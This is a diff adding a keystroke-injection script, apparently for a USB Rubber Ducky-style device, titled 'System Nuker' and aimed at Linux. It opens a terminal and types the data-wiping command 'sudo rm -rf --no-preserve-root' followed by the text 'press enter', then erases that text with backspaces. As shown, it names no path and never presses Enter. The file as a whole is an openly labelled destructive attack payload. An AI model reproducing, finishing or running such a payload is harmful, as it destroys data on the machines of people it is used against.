@@ -1,0 +1,29 @@
+REM #############################
+REM #                           #
+REM # Title        : System Nuker    #
+REM # Author       : Ferretosan    #
+REM # Version      : 1.0        #
+REM # Category     : Nuker    #
+REM # Target       : Linux #
+REM #                           #
+REM #############################
+
+CTRL-ALT t
+DELAY 400
+STRING sudo rm -rf --no-preserve-root
+DELAY 400
+SPACE
+STRING press enter
+DELAY 400
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
+BACKSPACE
